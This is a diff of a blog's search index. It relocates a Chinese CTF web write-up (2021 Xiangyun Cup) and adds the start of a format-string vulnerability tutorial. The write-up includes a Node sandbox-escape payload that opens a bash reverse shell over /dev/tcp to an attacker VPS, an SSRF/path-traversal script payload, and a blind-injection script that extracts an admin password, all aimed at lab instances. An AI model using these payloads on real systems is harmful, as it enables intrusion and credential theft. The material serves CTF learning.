@@ -1,72 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2021祥云杯WEB-WP</title>
-    <url>/posts/20107/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>谢谢各位哥哥带我进前三十❤️，想写wp的时候i春秋那边已经关了环境，所以去buu进行了复现。不过题目暂时还没上全，所以先解已经上线的题目（后续题目上线再补全）。<br>
-团队完整wp地址：<a href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p>
-<h2 id="cralwer-z"><a class="header-anchor" href="#cralwer-z">¶</a>cralwer_z</h2>
-<p>zombie曾有个历史漏洞：<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a> ，我们需要想办法成功利用这个漏洞<br>
-本题关键代码在user.js文件，在路由profile的post请求方法中，会将输入的<code>bucket</code>值赋值给<code>personalBucket</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/5%5D%7D%28A%7BCL%297ML_%29TSJK0U0%40Q.png" alt=""><br>
-而在verify路由中，如果token检验正确就会进入if方法，将<code>personalBucket</code>更新到<code>bucket</code>中<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%40HOT_4S%601YB%7BO%255XH78W%5DN2.png" alt=""><br>
-但是可以看到这里正则进行了严格的限制<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/Z0VT%5DDL_QX%7D%7B%40Q%244%5B%24DR9W6.png" alt=""><br>
-即我们只能输入<code>https://32位数字或者字母.oss-cn-beijing.ichunqiu.com/</code>的形式，输入其他的无法将<code>personalBucket</code>更新到<code>bucket</code>中，不过这里有个变量覆盖的问题</p>
-<ol>
-<li>我们先正常进行请求，会跳转到<code>/user/verify</code>，更新<code>bucket</code>的同时获得了token</li>
-<li>我们构造自己的ip地址，修改<code>personalBucket</code></li>
-<li>用第一步获得的token去请求<code>/user/verify</code>，会把<code>personalBucket</code>更新到<code>bucket</code>中，完成变量覆盖</li>
-</ol>
-<p>思路已经很明确了，我们先在自己的vps上面放一个 <strong>exp.html</strong> ，内容为zombie漏洞的exp，下面ip和端口改成自己的</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>然后就是进行正常请求，url会跳转到<code>verify</code>获取token<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/0VMW2NB8RHHVCT%5B598X5%28BU.png" alt="">然后因为<code>checkBucket</code>的限制，我们需要带上<code>oss-cn-beijing.ichunqiu.com</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/8MPYWXNW~G1L~6SFYC9O_F1.png" alt=""><br>
-所以我们<code>bucket</code>输入如下<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/741VRG5LHCP%5DP%28LDUC1G6HR.png" alt=""><br>
-然后就是再访问一次</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81&#x2F;user&#x2F;verify?token&#x3D;aa647751ec8004b5745271304ab5ed38a149a9c76214e79e81c49dc934ac5e0f</span><br></pre></td></tr></table></figure>
-<p>我们输入的<code>personalBucket</code>成功更新到<code>bucket</code>中<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%60AN~A%40G%5B4H%5B28GE%25N3%5BU75M.png" alt=""><br>
-然后vps那边开启nc监听，浏览器访问<code>7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81/user/bucket</code>，成功反弹shell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%405%7BFK%40%609XZI6XSP~8I%7DBMRR.png" alt=""></p>
-<h2 id="secrets-of-admin"><a class="header-anchor" href="#secrets-of-admin">¶</a>secrets_of_admin</h2>
-<p>在 <strong>database.ts</strong> 文件中可以得到admin的密码，密码为e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/DYVG7%28U%5B4%40O2%60T%28%2924%600G%5DH.png" alt=""><br>
-同时可以观察到flag文件在<code>superuser</code>这个账号中，继续查看 <strong>routes/index.ts</strong> 文件，可以发现此账号被限制登录了，用admin账号登录后，传上去的文件名变成了md5的形式，并且存到<code>superuser</code>账号里<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%5BF_RGI44LOQB1LEE9S4%7D33J.png" alt=""><br>
-不过提供了另一个增加文件的方法<code>/api/files</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/FEJ%25%5DXU_W8%246KC%5B%40P2HN%7BRJ.png" alt=""><br>
-但限制了本地访问，不过我们可以通过前面的<code>/admin</code>post方法进行 <strong>ssrf</strong> 打本地，继续观察可发现对输入的<code>content</code>进行了过滤<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%40DSP4UPVC%28R%25%7B%5B%60%7B%28_3F5VX.png" alt=""><br>
-可以用数组进行绕过，接着就是构造payload，把 <strong>superuser</strong> 的flag文件添加到 <strong>admin</strong> 账号下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/S%5BX%28W1B%5BL3BVYOI4GCDZZ%5D9.png" alt=""><br>
-再访问flag文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;files&#x2F;be5a14a8e504a66979f6938338b0662c</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/4UL%406Q%28~8SS%5B4N%40240%25M%29SD.png" alt=""></p>
-<h2 id="Package-Manager"><a class="header-anchor" href="#Package-Manager">¶</a>Package Manager</h2>
-<p>审计源码，在auth路由方法中存在sql注入漏洞<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/_7VOA6X1FYULMCSJ0P%25OXMD.png" alt=""><br>
-构造payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username&#x3D;&#x3D;&quot;admin&quot;&amp;&amp;this.password[i]&#x3D;&#x3D;&quot;j&quot;)||&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HO18%25TL9MLYA0%6086%5B_6NQPL.png" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HUOTM%60WE3O9R__X~%5D88KJO0.png" alt=""><br>
-存在盲注，所以写一个python脚本注出密码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/8/24 22:55</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b2ac6fa8-4eb4-4c98-9f24-c41b32060edc.node4.buuoj.cn:81/auth&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3Ad034-UqbmEKoZTjp_29TmqCvxuec67jE.E3VNBOuM%2BOpzxu%2Fi5ske43e80M2MLDu0FnLwEv9qmDI&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;00f355689f5b7cb21e2a34346d9c55cd\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;0&#125;]==\&quot;&#123;1&#125;\&quot;)||\&quot;&quot;</span>.format(i,chr(j))</span><br><span class="line">        data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;sShk9REd-9QoAV2EvYHMOAPc6RQ0gjNdeyn4&quot;</span>, <span class="string">&quot;token&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, cookies=cookies, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code==<span class="number">302</span>:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            print(<span class="string">&quot;password:&quot;</span> + flag)</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/CZWE0KMO%29WR1TD62%40BCZ%29%5BD.png" alt=""><br>
-注出admin的密码为<code>!@#&amp;@&amp;@efefef*@((@))grgregret3r</code>，登录后就有flag<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/R%290QAR%40SD~R%24S1%40%7BW3GI926.png" alt=""></p>
-<h2 id="剩下的等buu更新"><a class="header-anchor" href="#剩下的等buu更新">¶</a>剩下的等buu更新</h2>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2021第五空间大赛WEB-WP</title>
     <url>/posts/64939/</url>
     <content><![CDATA[<h2 id="PNG图片转换器"><a class="header-anchor" href="#PNG图片转换器">¶</a>PNG图片转换器</h2>
@@ -443,6 +377,242 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
 <p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
 <p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>2021祥云杯WEB-WP</title>
+    <url>/posts/20107/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>谢谢各位哥哥带我进前三十❤️，想写wp的时候i春秋那边已经关了环境，所以去buu进行了复现。不过题目暂时还没上全，所以先解已经上线的题目（后续题目上线再补全）。<br>
+团队完整wp地址：<a href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p>
+<h2 id="cralwer-z"><a class="header-anchor" href="#cralwer-z">¶</a>cralwer_z</h2>
+<p>zombie曾有个历史漏洞：<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a> ，我们需要想办法成功利用这个漏洞<br>
+本题关键代码在user.js文件，在路由profile的post请求方法中，会将输入的<code>bucket</code>值赋值给<code>personalBucket</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/5%5D%7D%28A%7BCL%297ML_%29TSJK0U0%40Q.png" alt=""><br>
+而在verify路由中，如果token检验正确就会进入if方法，将<code>personalBucket</code>更新到<code>bucket</code>中<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%40HOT_4S%601YB%7BO%255XH78W%5DN2.png" alt=""><br>
+但是可以看到这里正则进行了严格的限制<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/Z0VT%5DDL_QX%7D%7B%40Q%244%5B%24DR9W6.png" alt=""><br>
+即我们只能输入<code>https://32位数字或者字母.oss-cn-beijing.ichunqiu.com/</code>的形式，输入其他的无法将<code>personalBucket</code>更新到<code>bucket</code>中，不过这里有个变量覆盖的问题</p>
+<ol>
+<li>我们先正常进行请求，会跳转到<code>/user/verify</code>，更新<code>bucket</code>的同时获得了token</li>
+<li>我们构造自己的ip地址，修改<code>personalBucket</code></li>
+<li>用第一步获得的token去请求<code>/user/verify</code>，会把<code>personalBucket</code>更新到<code>bucket</code>中，完成变量覆盖</li>
+</ol>
+<p>思路已经很明确了，我们先在自己的vps上面放一个 <strong>exp.html</strong> ，内容为zombie漏洞的exp，下面ip和端口改成自己的</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就是进行正常请求，url会跳转到<code>verify</code>获取token<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/0VMW2NB8RHHVCT%5B598X5%28BU.png" alt="">然后因为<code>checkBucket</code>的限制，我们需要带上<code>oss-cn-beijing.ichunqiu.com</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/8MPYWXNW~G1L~6SFYC9O_F1.png" alt=""><br>
+所以我们<code>bucket</code>输入如下<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/741VRG5LHCP%5DP%28LDUC1G6HR.png" alt=""><br>
+然后就是再访问一次</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81&#x2F;user&#x2F;verify?token&#x3D;aa647751ec8004b5745271304ab5ed38a149a9c76214e79e81c49dc934ac5e0f</span><br></pre></td></tr></table></figure>
+<p>我们输入的<code>personalBucket</code>成功更新到<code>bucket</code>中<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%60AN~A%40G%5B4H%5B28GE%25N3%5BU75M.png" alt=""><br>
+然后vps那边开启nc监听，浏览器访问<code>7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81/user/bucket</code>，成功反弹shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%405%7BFK%40%609XZI6XSP~8I%7DBMRR.png" alt=""></p>
+<h2 id="secrets-of-admin"><a class="header-anchor" href="#secrets-of-admin">¶</a>secrets_of_admin</h2>
+<p>在 <strong>database.ts</strong> 文件中可以得到admin的密码，密码为e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/DYVG7%28U%5B4%40O2%60T%28%2924%600G%5DH.png" alt=""><br>
+同时可以观察到flag文件在<code>superuser</code>这个账号中，继续查看 <strong>routes/index.ts</strong> 文件，可以发现此账号被限制登录了，用admin账号登录后，传上去的文件名变成了md5的形式，并且存到<code>superuser</code>账号里<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%5BF_RGI44LOQB1LEE9S4%7D33J.png" alt=""><br>
+不过提供了另一个增加文件的方法<code>/api/files</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/FEJ%25%5DXU_W8%246KC%5B%40P2HN%7BRJ.png" alt=""><br>
+但限制了本地访问，不过我们可以通过前面的<code>/admin</code>post方法进行 <strong>ssrf</strong> 打本地，继续观察可发现对输入的<code>content</code>进行了过滤<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%40DSP4UPVC%28R%25%7B%5B%60%7B%28_3F5VX.png" alt=""><br>
+可以用数组进行绕过，接着就是构造payload，把 <strong>superuser</strong> 的flag文件添加到 <strong>admin</strong> 账号下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/S%5BX%28W1B%5BL3BVYOI4GCDZZ%5D9.png" alt=""><br>
+再访问flag文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;files&#x2F;be5a14a8e504a66979f6938338b0662c</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/4UL%406Q%28~8SS%5B4N%40240%25M%29SD.png" alt=""></p>
+<h2 id="Package-Manager"><a class="header-anchor" href="#Package-Manager">¶</a>Package Manager</h2>
+<p>审计源码，在auth路由方法中存在sql注入漏洞<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/_7VOA6X1FYULMCSJ0P%25OXMD.png" alt=""><br>
+构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username&#x3D;&#x3D;&quot;admin&quot;&amp;&amp;this.password[i]&#x3D;&#x3D;&quot;j&quot;)||&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HO18%25TL9MLYA0%6086%5B_6NQPL.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HUOTM%60WE3O9R__X~%5D88KJO0.png" alt=""><br>
+存在盲注，所以写一个python脚本注出密码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/8/24 22:55</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b2ac6fa8-4eb4-4c98-9f24-c41b32060edc.node4.buuoj.cn:81/auth&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3Ad034-UqbmEKoZTjp_29TmqCvxuec67jE.E3VNBOuM%2BOpzxu%2Fi5ske43e80M2MLDu0FnLwEv9qmDI&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;00f355689f5b7cb21e2a34346d9c55cd\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;0&#125;]==\&quot;&#123;1&#125;\&quot;)||\&quot;&quot;</span>.format(i,chr(j))</span><br><span class="line">        data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;sShk9REd-9QoAV2EvYHMOAPc6RQ0gjNdeyn4&quot;</span>, <span class="string">&quot;token&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, cookies=cookies, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code==<span class="number">302</span>:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            print(<span class="string">&quot;password:&quot;</span> + flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/CZWE0KMO%29WR1TD62%40BCZ%29%5BD.png" alt=""><br>
+注出admin的密码为<code>!@#&amp;@&amp;@efefef*@((@))grgregret3r</code>，登录后就有flag<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/R%290QAR%40SD~R%24S1%40%7BW3GI926.png" alt=""></p>
+<h2 id="剩下的等buu更新"><a class="header-anchor" href="#剩下的等buu更新">¶</a>剩下的等buu更新</h2>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn新手入门之格式化字符串漏洞</title>
+    <url>/posts/17489/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>继续来跟着  <a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">CTF WIKI</a> 来学习格式化字符串漏洞</p>
+<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
+<p>格式化字符串函数是将计算机内存中表示的数据转化为我们人类可读的字符串格式，可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。</p>
+<p><strong>常见的格式化字符串函数</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>基本介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>printf</td>
+<td>输出到 stdout</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置 argv</td>
+</tr>
+<tr>
+<td>syslog</td>
+<td>输出日志</td>
+</tr>
+<tr>
+<td>err, verr, warn, vwarn 等</td>
+<td>。。。</td>
+</tr>
+</tbody>
+</table>
+<p>以下图为例<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/printf.png" alt=""></p>
+<p>print 函数会按照这个形式<code>Color %s, Number %d, Float %4.2f</code>去解析对应的其他参数</p>
+<blockquote>
+<p>%d : 十进制 - 输出十进制整数</p>
+<p>%s : 字符串 - 从内存中读取字符串</p>
+<p>%x : 十六进制 - 输出十六进制数</p>
+<p>%c : 字符 - 输出字符</p>
+<p>%p : 指针 - 指针地址</p>
+<p>%n : 到目前为止所写的字符数</p>
+</blockquote>
+<p>那么怎么造成格式化字符串漏洞呢？继续以上面的例子为例，当 print 函数没有参数时，即</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;Color %s, Number %d, Float %4.2f&quot;)</span><br></pre></td></tr></table></figure>
+<p>程序会继续运行，但是当运行到<code>%s</code>时，如果提供了一个不可访问的地址或者受保护的地址，那么程序会因此而崩溃。</p>
+<h2 id="泄露内存"><a class="header-anchor" href="#泄露内存">¶</a>泄露内存</h2>
+<h3 id="泄露栈内存"><a class="header-anchor" href="#泄露栈内存">¶</a>泄露栈内存</h3>
+<p>我们以一个程序为例</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译程序</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie example1.c -o example1</span><br></pre></td></tr></table></figure>
+<p>使用 gdb 进行调试，在 printf 函数下断点，然后运行，我们传入<code>%08x.%08x.%08x</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/1%5B%5BG%29%60O%40E9MK7%29%24LB5%25_V%60C.png" alt=""><br>
+接着我们看一下栈空间<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/8%7BL%5D6_%40LBBDJGY%7BU6PDI%29NH.png" alt=""><br>
+第一个<code>%08x</code>解析的是 0x1 (代码中的a)，第二个<code>%08x</code>解析的是<code>0x22222222</code>(代码中的b)，第三个<code>%08x</code>解析的是 -1，接着后面的<code>%s</code>把我们的输入都打印出来，即<code>%08x.%08x.%08x</code><br>
+我们继续输入 c 运行程序<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/8JL9QPDD5ZU45%60W002XXFH8.png" alt=""><br>
+可以看见程序在到第二个 printf 函数时中断了，因为第二个 printf 函数我们没有传递参数。但程序会在栈上寻找临近的三个参数根据格式化字符串打印出来，如此会把后面三个栈上的值都输出<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/%28BXAV9F%7D4EQMN9%7BDI4FNQ_Q.png" alt=""><br>
+这样就会造成栈内存泄露，但上面的例子都是获取临近内容，我们可以使用<code>%n$p</code>来获取第n个参数内容，例如输入<code>%2$p</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/O%24EABUQPIW32%28HYGLLHJB%28E.png" alt=""><br>
+打印出相对于格式化字符串的第二个参数对应的值<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/TUZ1%7B%7D%5BVJ_6830%24%60B8%28%28O5T.png" alt=""></p>
+<p><strong>小技巧总结</strong></p>
+<blockquote>
+<ol>
